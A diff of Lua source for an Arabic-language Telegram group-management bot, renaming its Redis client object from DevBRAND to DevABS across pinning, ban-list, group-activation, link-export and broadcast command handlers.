 if text and text:match("^ضع صوره$") and ChCheck(msg) or text and text:match("^وضع صوره$") and ChCheck(msg) then
 Dev_BRAND(msg.chat_id_,msg.id_, 1, '⌁︙ارسل صورة المجموعه الان', 1, 'md')
-DevBRAND:set(BRAND..'BRAND:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
+DevABS:set(BRAND..'BRAND:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
 end
 --     Source BRAND     --
 if text and text:match("^حذف الصوره$") and ChCheck(msg) or text and text:match("^مسح الصوره$") and ChCheck(msg) then
@@ -8984,13 +8984,13 @@ end
 --     Source BRAND     --
 if Manager(msg) then
 if text and text:match("^الغاء تثبيت$") and ChCheck(msg) or text and text:match("^الغاء التثبيت$") and ChCheck(msg) then
-if DevBRAND:sismember(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
+if DevABS:sismember(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
 Dev_BRAND(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
 return false  
 end
 tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
 if data.ID == "Ok" then
-DevBRAND:del(BRAND..'BRAND:PinnedMsg'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:PinnedMsg'..msg.chat_id_)
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم الغاء تثبيت الرساله'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 return false  
@@ -9007,7 +9007,7 @@ end,nil)
 end
 --     Source BRAND     --
 if text and text:match("^الغاء تثبيت الكل$") then  
-if DevBRAND:sismember(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
+if DevABS:sismember(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
 Dev_BRAND(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
 return false  
 end
@@ -9016,7 +9016,7 @@ if data.ID == "Ok" then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم الغاء تثبيت الكل'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 https.request('https://api.telegram.org/bot'..TokenBot..'/unpinAllChatMessages?chat_id='..msg.chat_id_)
-DevBRAND:del(BRAND.."BRAND:PinnedMsg"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:PinnedMsg"..msg.chat_id_)
 return false  
 end
 if data.code_ == 6 then
@@ -9031,11 +9031,11 @@ end,nil)
 end
 --     Source BRAND     --
 if text and text:match("^اعاده تثبيت$") and ChCheck(msg) or text and text:match("^اعاده التثبيت$") and ChCheck(msg) or text and text:match("^اعادة التثبيت$") and ChCheck(msg) then
-if DevBRAND:sismember(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
+if DevABS:sismember(BRAND.."BRAND:Lock:Pinpin",msg.chat_id_) and not BasicConstructor(msg) then
 Dev_BRAND(msg.chat_id_,msg.id_, 1, "⌁︙التثبيت والغاء واعادة التثبيت تم قفله من قبل المنشئين الاساسيين", 1, 'md')
 return false  
 end
-local PinId = DevBRAND:get(BRAND..'BRAND:PinnedMsg'..msg.chat_id_)
+local PinId = DevABS:get(BRAND..'BRAND:PinnedMsg'..msg.chat_id_)
 if PinId then
 Pin(msg.chat_id_,PinId,0)
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم اعادة تثبيت الرساله'
@@ -9060,12 +9060,12 @@ if text and text:match("^مسح المحظورين$") or text and text:match("^�
 local function RemoveBlockList(extra, result)
 if tonumber(result.total_count_) == 0 then 
 Dev_BRAND(msg.chat_id_, msg.id_, 0,'⌁︙*لا يوجد محظورين*', 1, 'md')
-DevBRAND:del(BRAND..'BRAND:Ban:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Ban:'..msg.chat_id_)
 else
 local x = 0
 for x,y in pairs(result.members_) do
 tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = y.user_id_, status_ = { ID = "ChatMemberStatusLeft" }, }, dl_cb, nil)
-DevBRAND:del(BRAND..'BRAND:Ban:'..msg.chat_id_)
+DevABS:del(BRAND..'BRAND:Ban:'..msg.chat_id_)
 x = x + 1
 end
 ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⌁︙تم حذف المحظورين")  
@@ -9076,7 +9076,7 @@ end
 end
 --     Source BRAND     --
 if text and text:match("^معلومات المجموعه$") and ChCheck(msg) or text and text:match("^عدد الاعضاء$") and ChCheck(msg) or text and text:match("^عدد الكروب$") and ChCheck(msg) or text and text:match("^عدد الادمنيه$") and ChCheck(msg) or text and text:match("^عدد المحظورين$") and ChCheck(msg) then
-local Muted = DevBRAND:scard(BRAND.."BRAND:Muted:"..msg.chat_id_) or "0"
+local Muted = DevABS:scard(BRAND.."BRAND:Muted:"..msg.chat_id_) or "0"
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
 tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه ↫ ❨ '..dp.title_..' ❩\n⌁︙الايدي ↫ ❨ '..msg.chat_id_..' ❩\n⌁︙عدد الاعضاء ↫ ❨ *'..data.member_count_..'* ❩\n⌁︙عدد الادمنيه ↫ ❨ *'..data.administrator_count_..'* ❩\n⌁︙عدد المطرودين ↫ ❨ *'..data.kicked_count_..'* ❩\n⌁︙عدد المكتومين ↫ ❨ *'..Muted..'* ❩\n⌁︙عدد رسائل المجموعه ↫ ❨ *'..(msg.id_/2097152/0.5)..'* ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n', 1, 'md') 
@@ -9089,13 +9089,13 @@ local ChatId = text:match('كشف (-%d+)')
 if not SudoBot(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطورين فقط', 1, 'md')
 else
-local ConstructorList = DevBRAND:scard(BRAND.."BRAND:Constructor:"..ChatId) or 0
-local BanedList = DevBRAND:scard(BRAND.."BRAND:Ban:"..ChatId) or 0
-local ManagerList = DevBRAND:scard(BRAND.."BRAND:Managers:"..ChatId) or 0
-local MutedList = DevBRAND:scard(BRAND.."BRAND:Muted:"..ChatId) or 0
-local TkeedList = DevBRAND:scard(BRAND.."BRAND:BRAND:Tkeed:"..ChatId) or 0
-local AdminsList = DevBRAND:scard(BRAND.."BRAND:Admins:"..ChatId) or 0
-local VipList = DevBRAND:scard(BRAND.."BRAND:VipMem:"..ChatId) or 0
+local ConstructorList = DevABS:scard(BRAND.."BRAND:Constructor:"..ChatId) or 0
+local BanedList = DevABS:scard(BRAND.."BRAND:Ban:"..ChatId) or 0
+local ManagerList = DevABS:scard(BRAND.."BRAND:Managers:"..ChatId) or 0
+local MutedList = DevABS:scard(BRAND.."BRAND:Muted:"..ChatId) or 0
+local TkeedList = DevABS:scard(BRAND.."BRAND:BRAND:Tkeed:"..ChatId) or 0
+local AdminsList = DevABS:scard(BRAND.."BRAND:Admins:"..ChatId) or 0
+local VipList = DevABS:scard(BRAND.."BRAND:VipMem:"..ChatId) or 0
 local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
 if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/CXRCX' end
 tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
@@ -9133,7 +9133,7 @@ if dp.id_ then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙المجموعه ↫ ["..dp.title_.."]\n⌁︙تمت المغادره منها بنجاح", 1, "md")
 Dev_BRAND(Text[2], 0, 1, "⌁︙بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
 ChatLeave(dp.id_, BRAND)
-DevBRAND:srem(BRAND.."BRAND:Groups", dp.id_)
+DevABS:srem(BRAND.."BRAND:Groups", dp.id_)
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
 end 
@@ -9143,7 +9143,7 @@ end
 --     Source BRAND     --
 if text and text:match("^تعين عدد الاعضاء (%d+)$") and SecondSudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and SecondSudo(msg) then
 local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
-DevBRAND:set(BRAND..'BRAND:Num:Add:Bot',Num) 
+DevABS:set(BRAND..'BRAND:Num:Add:Bot',Num) 
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙تم وضع عدد الاعضاء ↫ *'..Num..'* عضو', 1, 'md')
 end
 --     Source BRAND     --
@@ -9153,7 +9153,7 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 
 else 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل البوت الخدمي'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Lock:FreeBot'..BRAND) 
+DevABS:del(BRAND..'BRAND:Lock:FreeBot'..BRAND) 
 end 
 end
 if text == 'تعطيل البوت الخدمي' then 
@@ -9162,25 +9162,25 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط', 
 else 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل البوت الخدمي'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Lock:FreeBot'..BRAND,true) 
+DevABS:set(BRAND..'BRAND:Lock:FreeBot'..BRAND,true) 
 end 
 end
 if ChatType == 'sp' or ChatType == 'gp'  then
 if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل الالعاب بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND..'BRAND:Lock:Games'..msg.chat_id_) 
+DevABS:del(BRAND..'BRAND:Lock:Games'..msg.chat_id_) 
 end
 if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل الالعاب بنجاح'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND..'BRAND:Lock:Games'..msg.chat_id_,true)  
+DevABS:set(BRAND..'BRAND:Lock:Games'..msg.chat_id_,true)  
 end
 if text == "تفعيل الرابط" or text == "تفعيل جلب الرابط" then 
 if Admin(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تفعيل جلب رابط المجموعه'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:del(BRAND.."BRAND:Lock:GpLinks"..msg.chat_id_)
+DevABS:del(BRAND.."BRAND:Lock:GpLinks"..msg.chat_id_)
 return false  
 end
 end
@@ -9188,7 +9188,7 @@ if text == "تعطيل الرابط" or text == "تعطيل جلب الرابط"
 if Admin(msg) then
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙تم تعطيل جلب رابط المجموعه'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
-DevBRAND:set(BRAND.."BRAND:Lock:GpLinks"..msg.chat_id_,"ok")
+DevABS:set(BRAND.."BRAND:Lock:GpLinks"..msg.chat_id_,"ok")
 return false  
 end
 end
@@ -9203,8 +9203,8 @@ Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙البوت ليس ادمن يرجى �
 return false  
 end
 tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
-if tonumber(data.member_count_) < tonumber(DevBRAND:get(BRAND..'BRAND:Num:Add:Bot') or 0) and not SecondSudo(msg) then
-Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevBRAND:get(BRAND..'BRAND:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
+if tonumber(data.member_count_) < tonumber(DevABS:get(BRAND..'BRAND:Num:Add:Bot') or 0) and not SecondSudo(msg) then
+Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙عدد اعضاء المجموعه اقل من ↫ *'..(DevABS:get(BRAND..'BRAND:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
 return false
 end
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
@@ -9213,35 +9213,35 @@ tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100"
 local admins = abbas.members_
 for i=0 , #admins do
 if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevABS:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
 if ba.first_name_ == false then
-DevBRAND:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevABS:srem(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
 end
 end,nil)
 else
-DevBRAND:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
+DevABS:sadd(BRAND..'BRAND:Admins:'..msg.chat_id_, admins[i].user_id_)
 end
 if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
-DevBRAND:sadd(BRAND.."BRAND:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
-DevBRAND:sadd(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevABS:sadd(BRAND.."BRAND:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevABS:sadd(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,admins[i].user_id_)
 tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
 if ba.first_name_ == false then
-DevBRAND:srem(BRAND.."BRAND:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
-DevBRAND:srem(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevABS:srem(BRAND.."BRAND:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
+DevABS:srem(BRAND.."BRAND:BRANDConstructor:"..msg.chat_id_,admins[i].user_id_)
 end
 end,nil)  
 end 
 end
 end,nil)
-if DevBRAND:sismember(BRAND..'BRAND:Groups',msg.chat_id_) then
+if DevABS:sismember(BRAND..'BRAND:Groups',msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد مفعله', 1, 'md')
 else
 ReplyStatus(msg,result.id_,"ReplyBy","⌁︙تم تفعيل المجموعه "..dp.title_)  
-DevBRAND:sadd(BRAND.."BRAND:Groups",msg.chat_id_)
-if not DevBRAND:get(BRAND..'BRAND:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
-DevBRAND:incrby(BRAND..'BRAND:Sudos'..msg.sender_user_id_,1)
-DevBRAND:set(BRAND..'BRAND:SudosGp'..msg.sender_user_id_..msg.chat_id_,"BRAND")
+DevABS:sadd(BRAND.."BRAND:Groups",msg.chat_id_)
+if not DevABS:get(BRAND..'BRAND:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
+DevABS:incrby(BRAND..'BRAND:Sudos'..msg.sender_user_id_,1)
+DevABS:set(BRAND..'BRAND:SudosGp'..msg.sender_user_id_..msg.chat_id_,"BRAND")
 end
 local Name1 = result.first_name_
 local Name1 = Name1:gsub('"',"") 
@@ -9265,7 +9265,7 @@ LinkGroup = LinkGp.result
 else
 LinkGroup = 'لا يوجد'
 end
-DevBRAND:set(BRAND.."BRAND:Groups:Links"..msg.chat_id_,LinkGroup) 
+DevABS:set(BRAND.."BRAND:Groups:Links"..msg.chat_id_,LinkGroup) 
 if not Sudo(msg) then
 SendText(DevId,"⌁︙تم تفعيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
@@ -9277,11 +9277,11 @@ end
 if text == 'تعطيل' and SudoBot(msg) and ChCheck(msg) then
 tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
 tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
-if not DevBRAND:sismember(BRAND..'BRAND:Groups',msg.chat_id_) then
+if not DevABS:sismember(BRAND..'BRAND:Groups',msg.chat_id_) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙المجموعه بالتاكيد معطله', 1, 'md')
 else
 ReplyStatus(msg,result.id_,"ReplyBy","⌁︙تم تعطيل المجموعه "..dp.title_)  
-DevBRAND:srem(BRAND.."BRAND:Groups",msg.chat_id_)
+DevABS:srem(BRAND.."BRAND:Groups",msg.chat_id_)
 local Name1 = result.first_name_
 local Name1 = Name1:gsub('"',"") 
 local Name1 = Name1:gsub("'","") 
@@ -9303,7 +9303,7 @@ LinkGroup = LinkGp.result
 else
 LinkGroup = 'لا يوجد'
 end
-DevBRAND:set(BRAND.."BRAND:Groups:Links"..msg.chat_id_,LinkGroup) 
+DevABS:set(BRAND.."BRAND:Groups:Links"..msg.chat_id_,LinkGroup) 
 if not Sudo(msg) then
 SendText(DevId,"⌁︙تم تعطيل مجموعه جديده ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙بواسطة ↫ "..Name.."\n⌁︙اسم المجموعه ↫ ["..NameChat.."]\n⌁︙ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n⌁︙رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الوقت ↫ "..os.date("%I:%M%p").."\n⌁︙التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
 end
@@ -9356,16 +9356,16 @@ if text == 'روابط الكروبات' or text == 'روابط المجموعا
 if not SecondSudo(msg) then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙للمطور الاساسي فقط ', 1, 'md')
 else
-local List = DevBRAND:smembers(BRAND.."BRAND:Groups")
+local List = DevABS:smembers(BRAND.."BRAND:Groups")
 if #List == 0 then
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙لا توجد مجموعات مفعله', 1, 'md')
 else
 Dev_BRAND(msg.chat_id_, msg.id_, 1, '⌁︙جاري ارسال نسخه تحتوي على ↫ '..#List..' مجموعه', 1, 'md')
 local Text = "⌁︙Source BRAND\n⌁︙File Bot Groups\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 for k,v in pairs(List) do
-local GroupsManagers = DevBRAND:scard(BRAND.."BRAND:Managers:"..v) or 0
-local GroupsAdmins = DevBRAND:scard(BRAND.."BRAND:Admins:"..v) or 0
-local Groupslink = DevBRAND:get(BRAND.."BRAND:Groups:Links" ..v)
+local GroupsManagers = DevABS:scard(BRAND.."BRAND:Managers:"..v) or 0
+local GroupsAdmins = DevABS:scard(BRAND.."BRAND:Admins:"..v) or 0
+local Groupslink = DevABS:get(BRAND.."BRAND:Groups:Links" ..v)
 Text = Text..k.." ↬ ⤈ \n⌁︙Group ID ↬ "..v.."\n⌁︙Group Link ↬ "..(Groupslink or "Not Found").."\n⌁︙Group Managers ↬ "..GroupsManagers.."\n⌁︙Group Admins ↬ "..GroupsAdmins.."\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
 end
 local File = io.open('GroupsBot.txt', 'w')
@@ -9378,22 +9378,22 @@ end
 end
 --     Source BRAND     --
 if text == "اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
-if DevBRAND:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
+if DevABS:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-DevBRAND:setex(BRAND.."BRAND:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
+DevABS:setex(BRAND.."BRAND:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 return false
 end 
-if DevBRAND:get(BRAND.."BRAND:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
+if DevABS:get(BRAND.."BRAND:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false
 end 
-List = DevBRAND:smembers(BRAND..'BRAND:Users') 
+List = DevABS:smembers(BRAND..'BRAND:Users') 
 if msg.content_.text_ then
 for k,v in pairs(List) do 
 BRANDText = "الرساله"
@@ -9441,26 +9441,26 @@ sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)
 end 
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة "..BRANDText.." بنجاح \n⌁︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
 end
 --     Source BRAND     --
 if text == "اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
-if DevBRAND:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
+if DevABS:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-DevBRAND:setex(BRAND.."BRAND:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
+DevABS:setex(BRAND.."BRAND:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 return false
 end 
-if DevBRAND:get(BRAND.."BRAND:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
+if DevABS:get(BRAND.."BRAND:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false
 end 
-List = DevBRAND:smembers(BRAND..'BRAND:Groups') 
+List = DevABS:smembers(BRAND..'BRAND:Groups') 
 if msg.content_.text_ then
 for k,v in pairs(List) do 
 BRANDText = "الرساله"
@@ -9508,79 +9508,79 @@ sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)
 end 
 end
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة "..BRANDText.." بنجاح \n⌁︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
 end
 --     Source BRAND     --
 if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
-if DevBRAND:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
+if DevABS:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
 send(msg.chat_id_, msg.id_,"⌁︙الاذاعه معطله من قبل المطور الاساسي")
 return false
 end
-DevBRAND:setex(BRAND.."BRAND:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
+DevABS:setex(BRAND.."BRAND:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
 local BRANDTTEAM = '⌁︙اهلا عزيزي ↫ '..BRANDRank(msg)..' \n⌁︙ارسل الرساله الان لتوجيها \n⌁︙للخروج ارسل ↫ ( الغاء ) \n ✓'
 BRANDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BRANDTTEAM, 14, string.len(msg.sender_user_id_))
 return false
 end 
-if DevBRAND:get(BRAND.."BRAND:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
+if DevABS:get(BRAND.."BRAND:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
 if text == 'الغاء' then   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
 return false  
 end 
-local List = DevBRAND:smembers(BRAND..'BRAND:Groups')   
+local List = DevABS:smembers(BRAND..'BRAND:Groups')   
 for k,v in pairs(List) do  
 tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
 end   
 Dev_BRAND(msg.chat_id_, msg.id_, 1, "⌁︙تم اذاعة رسالتك بالتوجيه \n⌁︙‏في ↫ ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
-DevBRAND:del(BRAND.."BRAND:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
+DevABS:del(BRAND.."BRAND:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
 end
 --     Source BRAND     --
 if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص بالتوجيه ⌁" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
-if DevBRAND:get(BRAND.."BRAND:Send:Bot"..BRAND) and not SecondSudo(msg) then 
